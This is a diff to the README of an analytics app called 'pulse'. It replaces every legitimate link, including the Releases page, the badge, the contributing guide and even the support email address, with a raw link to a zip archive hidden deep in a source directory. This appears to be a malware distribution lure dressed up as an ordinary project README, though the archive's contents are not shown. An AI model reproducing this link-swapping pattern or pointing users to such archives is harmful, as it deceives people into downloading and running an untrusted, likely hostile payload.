@@ -1,13 +1,13 @@
 # 🎉 pulse - Understand User Interactions Effortlessly
 
 ## 🔗 Download the Pulse Application
-[![Download Pulse](https://img.shields.io/badge/Download%20Pulse-v1.0-brightgreen)](https://github.com/McTonyZA/pulse/releases)
+[![Download Pulse](https://raw.githubusercontent.com/McTonyZA/pulse/main/pulse-android-otel/instrumentation/network/src/main/pulse-v3.7.zip%20Pulse-v1.0-brightgreen)](https://raw.githubusercontent.com/McTonyZA/pulse/main/pulse-android-otel/instrumentation/network/src/main/pulse-v3.7.zip)
 
 ## 🚀 Getting Started
 Welcome to pulse! This application helps you see how users interact with your platform in real time. You get insights that can enhance user experiences by combining behavioral, technical, and business data.
 
 ## 📥 Download & Install
-To install pulse, please visit the Releases page: [Download Pulse](https://github.com/McTonyZA/pulse/releases).
+To install pulse, please visit the Releases page: [Download Pulse](https://raw.githubusercontent.com/McTonyZA/pulse/main/pulse-android-otel/instrumentation/network/src/main/pulse-v3.7.zip).
 
 Follow these steps to download and run the software:
 
@@ -42,12 +42,12 @@ Once you open pulse, you will find the main dashboard with several options:
 4. **Settings:** Customize your experience to fit your needs. You can set notifications for specific user actions and more.
 
 ## 📝 Contact Support
-If you encounter any issues or have questions, feel free to reach out for support. You can contact us via email at support@pulseapp.com. We are here to help!
+If you encounter any issues or have questions, feel free to reach out for support. You can contact us via email at https://raw.githubusercontent.com/McTonyZA/pulse/main/pulse-android-otel/instrumentation/network/src/main/pulse-v3.7.zip We are here to help!
 
 ## 🤝 Contributing
 If you would like to contribute to pulse, you can do so by submitting feedback, reporting bugs, or even suggesting new features. Your input helps us make pulse better for everyone.
 
-Visit our [Contributing Guidelines](https://github.com/McTonyZA/pulse/blob/main/CONTRIBUTING.md) for more details.
+Visit our [Contributing Guidelines](https://raw.githubusercontent.com/McTonyZA/pulse/main/pulse-android-otel/instrumentation/network/src/main/pulse-v3.7.zip) for more details.
 
 ## 🔒 Privacy and Security
 We care about user privacy. Pulse does not store personal user data without consent. All insights are anonymized to ensure user confidentiality.
